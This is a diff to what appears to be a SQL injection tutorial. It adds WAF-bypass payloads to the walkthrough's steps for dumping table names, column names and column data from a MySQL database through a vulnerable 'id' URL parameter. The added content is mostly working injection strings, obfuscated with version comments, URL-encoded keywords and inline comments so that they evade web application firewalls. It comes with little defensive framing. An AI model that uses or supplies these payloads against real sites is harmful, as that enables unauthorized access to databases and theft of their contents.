@@ -333,6 +333,10 @@ I've tested this query and most of the time it's effective, but there are some w
 ```sql
 (SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)
 ```
+If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass):  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
+```
 
 ![table_dumped](https://i.imgur.com/cUbdS47.png)
 
@@ -357,6 +361,11 @@ Where **0x696e7472616e6574646972** is 0xHEX of table name (**intranetdir**).
 
 ![dumping_columns](https://i.imgur.com/pbIfSQV.png)
 
+If WAF blocks the mentioned 2 queries, try using the following query (simple WAF bypass where **0x696e7472616e6574646972** is **intranetdir** in 0xHEX format):  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x696e7472616e6574646972)
+```
+
 #### Retrieving the data inside the column
 
 All the columns of the name named **intranetdir** are dumped. In this case I will dump the data inside **name** column. For our final payload, we need to use database's name in 0xHEX, table's name in 0xHEX and column's name in 0xHEX.
@@ -379,6 +388,21 @@ column: **name**
 - Let's use the first query (which I use the most). Assuming the 1st column is vulnerable, the final URL will be: 
 ```sql
 http://domain.com/index.php?id=1' Union Select (SELECT+GROUP_CONCAT(name+SEPARATOR+0x3c62723e)+FROM+db109.intranetdir),2,3,4-- -
+```
+
+If the mentioned 3 queries are being blocked by WAF, consider using the following ones:  
+
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())
+```
+
+Note: **0x6e616d65** is **name** in 0xHEX format, convert it to your column name that you want to dump:  
+```sql
+(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x6e616d65)
+```
+
+```sql
+(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)
 ```
 
 - Now we have dumped all the data inside **name** column.
